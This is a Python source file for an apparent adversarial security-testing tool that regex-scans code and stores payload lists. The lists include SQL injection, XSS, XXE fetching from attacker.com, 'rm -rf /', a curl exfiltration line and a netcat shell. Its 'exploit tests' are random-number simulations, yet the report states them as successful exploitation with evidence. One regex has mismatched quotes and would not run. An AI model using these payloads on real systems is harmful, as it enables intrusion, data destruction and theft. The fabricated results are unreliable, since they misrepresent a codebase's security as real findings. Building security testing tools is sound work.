#!/usr/bin/env python3
"""
Security Adversary Tool - RIF Adversarial Testing Suite

This tool performs adversarial security testing by simulating attacker behavior
to find security vulnerabilities that standard security scans might miss.
"""

import json
import subprocess
import os
import sys
import re
import base64
import urllib.parse
import hashlib
import random
import string
from typing import Dict, List, Tuple, Any, Optional
from dataclasses import dataclass
from pathlib import Path

@dataclass
class SecurityThreat:
    """Represents a potential security threat"""
    threat_type: str
    severity: str
    description: str
    location: str
    vulnerable_code: str
    attack_vectors: List[str]
    exploitation_methods: List[str]

@dataclass
class SecurityTestResult:
    """Results from security adversarial testing"""
    threat_type: str
    attack_vector: str
    payload: str
    successful: bool
    impact_assessment: str
    evidence: str
    mitigation: str

class SecurityAdversary:
    """Tool to perform adversarial security testing from attacker perspective"""
    
    def __init__(self, target_path: str):
        self.target_path = target_path
        self.security_threats = []
        self.test_results = []
        
        # Security vulnerability patterns
        self.vulnerability_patterns = {
            "sql_injection": r"(query|execute|select|insert|update|delete)\s*\(\s*[^)]*\+|f['\"].*{.*}.*['\"]",
            "xss": r"(innerHTML|outerHTML|document\.write|eval)\s*\(|<.*>.*<\/.*>",
            "command_injection": r"(exec|system|subprocess|shell_exec|eval)\s*\(",
            "path_traversal": r"(open|read|include|require)\s*\([^)]*\.\.\/',
            "hardcoded_secrets": r"(password|secret|key|token)\s*=\s*['\"][^'\"]{8,}['\"]",
            "weak_crypto": r"(md5|sha1|des|rc4)\s*\(",
            "insecure_random": r"(random\(\)|Math\.random|rand\(\))",
            "unvalidated_input": r"(request\.|params\.|query\.|body\.)[^.]+(?!.*validate|.*sanitize)",
            "buffer_overflow": r"(strcpy|strcat|sprintf|gets)\s*\(",
            "race_condition": r"(if.*then|check.*use).*(?!lock|mutex|atomic)",
            "privilege_escalation": r"(sudo|setuid|chmod\s+777|admin|root)",
            "information_disclosure": r"(error|exception|stack|trace).*\+.*\(|console\.(log|error|warn)",
            "authentication_bypass": r"(auth|login|authenticate).*==.*['\"]admin['\"]",
            "authorization_missing": r"(api|route|endpoint).*(?!auth|permission|role)"
        }
        
        # Attack payloads for testing
        self.attack_payloads = {
            "sql_injection": [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM information_schema.tables --",
                "'; EXEC xp_cmdshell('calc'); --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//"
            ],
            "command_injection": [
                "; ls -la",
                "&& cat /etc/passwd",
                "| whoami",
                "`rm -rf /`",
                "; curl http://attacker.com/steal-data"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd"
            ],
            "ldap_injection": [
                "*)(uid=*))(|(uid=*",
                "admin)(&(password=*))",
                "*)(|(password=*))",
                "*)(&(objectClass=*))"
            ],
            "xml_injection": [
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                "<!ENTITY % data SYSTEM 'http://attacker.com/steal'>",
                "<script>alert('XXE')</script>"
            ],
            "nosql_injection": [
                "{'$ne': null}",
                "{'$regex': '.*'}",
                "{'$where': 'this.password.match(/.*/)'}",
                "{'$gt': ''}"
            ]
        }
    
    def scan_for_threats(self) -> List[SecurityThreat]:
        """Scan codebase for potential security threats"""
        threats = []
        
        if os.path.isfile(self.target_path):
            file_threats = self._scan_file_threats(self.target_path)
            threats.extend(file_threats)
        elif os.path.isdir(self.target_path):
            for root, dirs, files in os.walk(self.target_path):
                for file in files:
                    if file.endswith(('.py', '.js', '.ts', '.java', '.php', '.cpp', '.c', '.go', '.rs')):
                        file_path = os.path.join(root, file)
                        file_threats = self._scan_file_threats(file_path)
                        threats.extend(file_threats)
        
        return threats
    
    def _scan_file_threats(self, file_path: str) -> List[SecurityThreat]:
        """Scan a single file for security threats"""
        threats = []
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                lines = content.split('\n')
            
            for vuln_type, pattern in self.vulnerability_patterns.items():
                matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
                
                for match in matches:
                    line_num = content[:match.start()].count('\n') + 1
                    line_content = lines[line_num - 1].strip()
                    
                    threat = SecurityThreat(
                        threat_type=vuln_type,
                        severity=self._assess_threat_severity(vuln_type, line_content),
                        description=self._generate_threat_description(vuln_type),
                        location=f"{file_path}:{line_num}",
                        vulnerable_code=line_content,
                        attack_vectors=self._generate_attack_vectors(vuln_type),
                        exploitation_methods=self._generate_exploitation_methods(vuln_type)
                    )
                    threats.append(threat)
                    
        except Exception as e:
            print(f"Error scanning {file_path}: {e}")
        
        return threats
    
    def _assess_threat_severity(self, threat_type: str, code_line: str) -> str:
        """Assess severity level of security threat"""
        critical_threats = {
            "sql_injection", "command_injection", "path_traversal", 
            "authentication_bypass", "privilege_escalation", "buffer_overflow"
        }
        
        high_threats = {
            "xss", "hardcoded_secrets", "weak_crypto", "unvalidated_input", 
            "information_disclosure"
        }
        
        medium_threats = {
            "insecure_random", "race_condition", "authorization_missing"
        }
        
        if threat_type in critical_threats:
            severity = "CRITICAL"
        elif threat_type in high_threats:
            severity = "HIGH"
        elif threat_type in medium_threats:
            severity = "MEDIUM"
        else:
            severity = "LOW"
        
        # Escalate severity for certain contexts
        if any(keyword in code_line.lower() for keyword in ["admin", "root", "sudo", "password", "secret"]):
            if severity == "HIGH":
                severity = "CRITICAL"
            elif severity == "MEDIUM":
                severity = "HIGH"
        
        return severity
    
    def _generate_threat_description(self, threat_type: str) -> str:
        """Generate human-readable threat description"""
        descriptions = {
            "sql_injection": "SQL injection vulnerability allowing database manipulation",
            "xss": "Cross-site scripting vulnerability allowing malicious script execution",
            "command_injection": "Command injection vulnerability allowing arbitrary command execution",
            "path_traversal": "Path traversal vulnerability allowing unauthorized file access",
            "hardcoded_secrets": "Hardcoded credentials or secrets in source code",
            "weak_crypto": "Use of weak or deprecated cryptographic algorithms",
            "insecure_random": "Use of predictable random number generation",
            "unvalidated_input": "User input not properly validated or sanitized",
            "buffer_overflow": "Potential buffer overflow vulnerability",
            "race_condition": "Race condition vulnerability in concurrent code",
            "privilege_escalation": "Potential privilege escalation vulnerability",
            "information_disclosure": "Information disclosure through error messages or logs",
            "authentication_bypass": "Authentication bypass vulnerability",
            "authorization_missing": "Missing authorization checks on sensitive operations"
        }
        return descriptions.get(threat_type, f"Security vulnerability of type {threat_type}")
    
    def _generate_attack_vectors(self, threat_type: str) -> List[str]:
        """Generate potential attack vectors for threat type"""
        attack_vectors = {
            "sql_injection": [
                "Direct parameter injection",
                "Header injection",
                "Cookie injection",
                "JSON payload injection",
                "Blind SQL injection"
            ],
            "xss": [
                "Stored XSS via user input",
                "Reflected XSS via URL parameters",
                "DOM-based XSS via client-side manipulation",
                "XSS via file uploads",
                "XSS via API responses"
            ],
            "command_injection": [
                "Direct command injection via user input",
                "Injection via environment variables",
                "Injection via file uploads",
                "Injection via configuration files"
            ],
            "path_traversal": [
                "Directory traversal via file parameters",
                "Traversal via URL encoding",
                "Traversal via double encoding",
                "Traversal via Unicode encoding"
            ],
            "authentication_bypass": [
                "Direct login bypass",
                "Session manipulation",
                "Token prediction or brute force",
                "Password reset exploitation"
            ]
        }
        return attack_vectors.get(threat_type, ["Generic attack vector"])
    
    def _generate_exploitation_methods(self, threat_type: str) -> List[str]:
        """Generate exploitation methods for threat type"""
        methods = {
            "sql_injection": [
                "Extract sensitive data from database",
                "Modify or delete database contents",
                "Execute operating system commands",
                "Escalate privileges within database"
            ],
            "xss": [
                "Steal user session cookies",
                "Redirect users to malicious sites",
                "Execute arbitrary JavaScript code",
                "Perform actions on behalf of users"
            ],
            "command_injection": [
                "Execute arbitrary system commands",
                "Read sensitive system files",
                "Install backdoors or malware",
                "Escalate system privileges"
            ],
            "path_traversal": [
                "Read sensitive configuration files",
                "Access user data files",
                "Read system password files",
                "Access application source code"
            ]
        }
        return methods.get(threat_type, ["Exploit vulnerability for unauthorized access"])
    
    def run_adversarial_tests(self) -> List[SecurityTestResult]:
        """Run adversarial security tests on identified threats"""
        results = []
        
        for threat in self.security_threats:
            print(f"Testing threat: {threat.threat_type} at {threat.location}")
            
            for attack_vector in threat.attack_vectors:
                for payload_type in self.attack_payloads.keys():
                    if payload_type == threat.threat_type or payload_type in threat.threat_type:
                        for payload in self.attack_payloads[payload_type]:
                            result = self._execute_adversarial_test(threat, attack_vector, payload)
                            results.append(result)
        
        return results
    
    def _execute_adversarial_test(self, threat: SecurityThreat, attack_vector: str, payload: str) -> SecurityTestResult:
        """Execute a specific adversarial security test"""
        # This is a simulation - in practice, this would execute actual security tests
        
        # Simulate test execution based on threat severity and payload type
        success_probability = self._calculate_exploit_probability(threat, payload)
        successful = random.random() < success_probability
        
        if successful:
            impact_assessment = self._assess_exploit_impact(threat, payload)
            evidence = f"Successful exploitation using payload: {payload}"
            mitigation = self._suggest_mitigation(threat.threat_type)
        else:
            impact_assessment = "NO_IMPACT"
            evidence = f"Exploit attempt failed with payload: {payload}"
            mitigation = "Continue monitoring for similar vulnerabilities"
        
        return SecurityTestResult(
            threat_type=threat.threat_type,
            attack_vector=attack_vector,
            payload=payload,
            successful=successful,
            impact_assessment=impact_assessment,
            evidence=evidence,
            mitigation=mitigation
        )
    
    def _calculate_exploit_probability(self, threat: SecurityThreat, payload: str) -> float:
        """Calculate probability of successful exploitation"""
        base_probability = 0.1  # Base 10% success rate
        
        # Adjust based on threat severity
        severity_multipliers = {
            "CRITICAL": 0.8,
            "HIGH": 0.6,
            "MEDIUM": 0.4,
            "LOW": 0.2
        }
        
        probability = base_probability * severity_multipliers.get(threat.severity, 0.1)
        
        # Adjust based on payload sophistication
        if len(payload) > 50:  # Complex payloads more likely to succeed
            probability *= 1.3
        
        if any(keyword in payload.lower() for keyword in ["union", "exec", "script", "alert"]):
            probability *= 1.5
        
        return min(probability, 0.95)  # Cap at 95% success rate
    
    def _assess_exploit_impact(self, threat: SecurityThreat, payload: str) -> str:
        """Assess the impact of successful exploitation"""
        if threat.severity == "CRITICAL":
            if "command" in threat.threat_type or "sql_injection" in threat.threat_type:
                return "SYSTEM_COMPROMISE"
            else:
                return "DATA_BREACH"
        elif threat.severity == "HIGH":
            if "xss" in threat.threat_type:
                return "USER_ACCOUNT_COMPROMISE"
            elif "secrets" in threat.threat_type:
                return "CREDENTIAL_EXPOSURE"
            else:
                return "DATA_EXPOSURE"
        elif threat.severity == "MEDIUM":
            return "INFORMATION_DISCLOSURE"
        else:
            return "MINOR_SECURITY_ISSUE"
    
    def _suggest_mitigation(self, threat_type: str) -> str:
        """Suggest mitigation strategies for threat type"""
        mitigations = {
            "sql_injection": "Use parameterized queries/prepared statements, validate and sanitize input",
            "xss": "Implement proper output encoding, use Content Security Policy, validate input",
            "command_injection": "Avoid executing user input, use safe APIs, validate and sanitize input",
            "path_traversal": "Validate file paths, use whitelist of allowed paths, sanitize input",
            "hardcoded_secrets": "Use environment variables or secure configuration management",
            "weak_crypto": "Use strong, modern cryptographic algorithms (AES-256, SHA-256+)",
            "insecure_random": "Use cryptographically secure random number generators",
            "unvalidated_input": "Implement comprehensive input validation and sanitization",
            "buffer_overflow": "Use safe string functions, implement bounds checking",
            "race_condition": "Use proper synchronization mechanisms (locks, mutexes)",
            "privilege_escalation": "Implement principle of least privilege, validate permissions",
            "information_disclosure": "Implement proper error handling, avoid exposing sensitive info",
            "authentication_bypass": "Implement robust authentication mechanisms, use secure sessions",
            "authorization_missing": "Implement proper authorization checks on all sensitive operations"
        }
        return mitigations.get(threat_type, "Implement security best practices for this vulnerability type")
    
    def generate_penetration_test_payloads(self, threat: SecurityThreat) -> List[str]:
        """Generate sophisticated penetration test payloads"""
        base_payloads = self.attack_payloads.get(threat.threat_type, [])
        
        # Generate additional sophisticated payloads
        advanced_payloads = []
        
        if threat.threat_type == "sql_injection":
            advanced_payloads.extend([
                "'; WAITFOR DELAY '00:00:05'; --",  # Time-based blind SQLi
                "' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1)) > 64; --",  # Boolean blind SQLi
                "' UNION SELECT @@version, database(), user(); --",  # Information gathering
            ])
        
        elif threat.threat_type == "xss":
            advanced_payloads.extend([
                "<svg/onload=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",  # Base64 encoded XSS
                "<iframe src=javascript:alert('XSS')>",  # iframe XSS
                "<input onfocus=alert('XSS') autofocus>",  # Auto-trigger XSS
            ])
        
        elif threat.threat_type == "command_injection":
            advanced_payloads.extend([
                "; python -c \"import os; os.system('whoami')\"",  # Python command injection
                "&& powershell -enc JABhAGwAZQByAHQAKAAnAGMAbQBkACcAKQA=",  # PowerShell encoded
                "| nc -l 4444 -e /bin/sh",  # Reverse shell attempt
            ])
        
        return base_payloads + advanced_payloads
    
    def generate_report(self, output_path: str):
        """Generate comprehensive security adversarial testing report"""
        successful_exploits = [r for r in self.test_results if r.successful]
        critical_exploits = [r for r in successful_exploits if "SYSTEM_COMPROMISE" in r.impact_assessment or "DATA_BREACH" in r.impact_assessment]
        
        report = {
            "tool": "Security Adversary",
            "timestamp": subprocess.check_output(['date', '-u', '+%Y-%m-%dT%H:%M:%SZ'], 
                                               text=True).strip(),
            "target_path": self.target_path,
            "summary": {
                "total_threats_identified": len(self.security_threats),
                "total_exploit_attempts": len(self.test_results),
                "successful_exploits": len(successful_exploits),
                "critical_exploits": len(critical_exploits),
                "threat_severity_distribution": {
                    "CRITICAL": len([t for t in self.security_threats if t.severity == "CRITICAL"]),
                    "HIGH": len([t for t in self.security_threats if t.severity == "HIGH"]),
                    "MEDIUM": len([t for t in self.security_threats if t.severity == "MEDIUM"]),
                    "LOW": len([t for t in self.security_threats if t.severity == "LOW"])
                }
            },
            "threat_landscape": {
                "threats_by_type": self._group_threats_by_type(),
                "high_risk_locations": self._identify_high_risk_locations()
            },
            "exploitation_results": {
                "critical_exploits": [self._test_result_to_dict(r) for r in critical_exploits],
                "successful_exploits": [self._test_result_to_dict(r) for r in successful_exploits],
                "exploit_success_rate": len(successful_exploits) / len(self.test_results) if self.test_results else 0
            },
            "security_threats": [self._threat_to_dict(t) for t in self.security_threats],
            "adversarial_test_results": [self._test_result_to_dict(r) for r in self.test_results],
            "security_recommendations": self._generate_security_recommendations(),
            "penetration_test_summary": self._generate_penetration_test_summary()
        }
        
        with open(output_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"Security adversarial testing report written to {output_path}")
    
    def _group_threats_by_type(self) -> Dict[str, List[Dict]]:
        """Group threats by type for analysis"""
        grouped = {}
        for threat in self.security_threats:
            threat_type = threat.threat_type
            if threat_type not in grouped:
                grouped[threat_type] = []
            grouped[threat_type].append(self._threat_to_dict(threat))
        return grouped
    
    def _identify_high_risk_locations(self) -> List[Dict[str, Any]]:
        """Identify locations with multiple high-risk threats"""
        location_risks = {}
        
        for threat in self.security_threats:
            file_path = threat.location.split(':')[0]
            if file_path not in location_risks:
                location_risks[file_path] = {"threats": [], "max_severity": "LOW"}
            
            location_risks[file_path]["threats"].append(threat)
            
            # Update max severity
            severity_levels = {"LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}
            current_max = severity_levels[location_risks[file_path]["max_severity"]]
            new_severity = severity_levels[threat.severity]
            
            if new_severity > current_max:
                location_risks[file_path]["max_severity"] = threat.severity
        
        # Sort by risk level and threat count
        high_risk_locations = []
        for file_path, risks in location_risks.items():
            if risks["max_severity"] in ["HIGH", "CRITICAL"] or len(risks["threats"]) >= 3:
                high_risk_locations.append({
                    "file_path": file_path,
                    "threat_count": len(risks["threats"]),
                    "max_severity": risks["max_severity"],
                    "threat_types": list(set(t.threat_type for t in risks["threats"]))
                })
        
        return sorted(high_risk_locations, 
                     key=lambda x: ({"LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}[x["max_severity"]], x["threat_count"]), 
                     reverse=True)
    
    def _threat_to_dict(self, threat: SecurityThreat) -> Dict[str, Any]:
        """Convert threat to dictionary for JSON serialization"""
        return {
            "threat_type": threat.threat_type,
            "severity": threat.severity,
            "description": threat.description,
            "location": threat.location,
            "vulnerable_code": threat.vulnerable_code,
            "attack_vectors": threat.attack_vectors,
            "exploitation_methods": threat.exploitation_methods
        }
    
    def _test_result_to_dict(self, result: SecurityTestResult) -> Dict[str, Any]:
        """Convert test result to dictionary for JSON serialization"""
        return {
            "threat_type": result.threat_type,
            "attack_vector": result.attack_vector,
            "payload": result.payload,
            "successful": result.successful,
            "impact_assessment": result.impact_assessment,
            "evidence": result.evidence,
            "mitigation": result.mitigation
        }
    
    def _generate_security_recommendations(self) -> List[str]:
        """Generate security recommendations based on findings"""
        recommendations = []
        
        successful_exploits = [r for r in self.test_results if r.successful]
        critical_exploits = [r for r in successful_exploits if "SYSTEM_COMPROMISE" in r.impact_assessment or "DATA_BREACH" in r.impact_assessment]
        
        if critical_exploits:
            recommendations.append(
                f"CRITICAL SECURITY RISK: Found {len(critical_exploits)} exploitable vulnerabilities "
                "that could lead to system compromise or data breach. Immediate remediation required."
            )
        
        # Threat-specific recommendations
        threat_types = set(t.threat_type for t in self.security_threats)
        
        if "sql_injection" in threat_types:
            recommendations.append(
                "SQL injection vulnerabilities detected. Implement parameterized queries and input validation."
            )
        
        if "xss" in threat_types:
            recommendations.append(
                "Cross-site scripting vulnerabilities found. Implement output encoding and CSP headers."
            )
        
        if "command_injection" in threat_types:
            recommendations.append(
                "Command injection vulnerabilities detected. Avoid executing user input and use safe APIs."
            )
        
        if "hardcoded_secrets" in threat_types:
            recommendations.append(
                "Hardcoded secrets found in source code. Move to secure configuration management."
            )
        
        # Severity-based recommendations
        critical_threats = [t for t in self.security_threats if t.severity == "CRITICAL"]
        if critical_threats:
            recommendations.append(
                f"Found {len(critical_threats)} critical security threats. Prioritize immediate remediation."
            )
        
        # General security recommendations
        recommendations.extend([
            "Implement comprehensive input validation and sanitization across all user inputs",
            "Use secure coding practices and security-focused code review processes",
            "Implement defense-in-depth security architecture with multiple layers of protection",
            "Regular security audits and penetration testing should be conducted",
            "Implement comprehensive logging and monitoring for security events",
            "Keep all dependencies and frameworks updated to latest secure versions",
            "Implement proper error handling that doesn't expose sensitive information",
            "Use principle of least privilege for all system components and user accounts"
        ])
        
        return recommendations
    
    def _generate_penetration_test_summary(self) -> Dict[str, Any]:
        """Generate penetration testing summary"""
        successful_exploits = [r for r in self.test_results if r.successful]
        
        exploit_impact_distribution = {}
        for result in successful_exploits:
            impact = result.impact_assessment
            exploit_impact_distribution[impact] = exploit_impact_distribution.get(impact, 0) + 1
        
        return {
            "total_vulnerabilities_tested": len(set(f"{r.threat_type}_{r.attack_vector}" for r in self.test_results)),
            "successful_exploitation_rate": len(successful_exploits) / len(self.test_results) if self.test_results else 0,
            "impact_distribution": exploit_impact_distribution,
            "most_vulnerable_threat_types": self._get_most_vulnerable_threat_types(),
            "penetration_testing_recommendations": [
                "Conduct regular penetration testing with updated attack techniques",
                "Implement bug bounty program to crowdsource vulnerability discovery",
                "Use automated security scanning tools in CI/CD pipeline",
                "Train developers in secure coding practices and threat modeling"
            ]
        }
    
    def _get_most_vulnerable_threat_types(self) -> List[Dict[str, Any]]:
        """Identify threat types with highest successful exploitation rates"""
        threat_stats = {}
        
        for result in self.test_results:
            threat_type = result.threat_type
            if threat_type not in threat_stats:
                threat_stats[threat_type] = {"attempts": 0, "successes": 0}
            
            threat_stats[threat_type]["attempts"] += 1
            if result.successful:
                threat_stats[threat_type]["successes"] += 1
        
        # Calculate success rates and sort
        vulnerable_types = []
        for threat_type, stats in threat_stats.items():
            success_rate = stats["successes"] / stats["attempts"]
            vulnerable_types.append({
                "threat_type": threat_type,
                "success_rate": round(success_rate, 3),
                "successful_exploits": stats["successes"],
                "total_attempts": stats["attempts"]
            })
        
        return sorted(vulnerable_types, key=lambda x: x["success_rate"], reverse=True)

def main():
    """Main entry point for security adversary tool"""
    if len(sys.argv) < 2:
        print("Usage: security-adversary.py <target_path> [output_file]")
        print("  target_path: Path to analyze (file or directory)")
        print("  output_file: Optional output file for report (default: security-adversary-report.json)")
        sys.exit(1)
    
    target_path = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else "security-adversary-report.json"
    
    adversary = SecurityAdversary(target_path)
    
    # Scan for security threats
    threats = adversary.scan_for_threats()
    adversary.security_threats.extend(threats)
    
    if adversary.security_threats:
        print(f"Identified {len(adversary.security_threats)} potential security threats")
        
        # Run adversarial security tests
        test_results = adversary.run_adversarial_tests()
        adversary.test_results.extend(test_results)
        
        successful_exploits = [r for r in test_results if r.successful]
        print(f"Executed adversarial tests: {len(successful_exploits)} successful exploits")
    else:
        print("No security threats identified")
    
    # Generate report
    adversary.generate_report(output_file)
    
    # Summary output
    if adversary.test_results:
        successful_exploits = [r for r in adversary.test_results if r.successful]
        critical_exploits = [r for r in successful_exploits 
                            if "SYSTEM_COMPROMISE" in r.impact_assessment or "DATA_BREACH" in r.impact_assessment]
        
        print(f"\nSecurity Adversarial Testing Summary:")
        print(f"  Security threats found: {len(adversary.security_threats)}")
        print(f"  Exploit attempts: {len(adversary.test_results)}")
        print(f"  Successful exploits: {len(successful_exploits)}")
        print(f"  Critical exploits: {len(critical_exploits)}")
        
        if critical_exploits:
            print(f"\nCRITICAL SECURITY EXPLOITS:")
            for exploit in critical_exploits[:5]:  # Show first 5
                print(f"    - {exploit.threat_type}")
                print(f"      Attack: {exploit.attack_vector}")
                print(f"      Impact: {exploit.impact_assessment}")
                print(f"      Evidence: {exploit.evidence[:100]}...")

if __name__ == "__main__":
    main()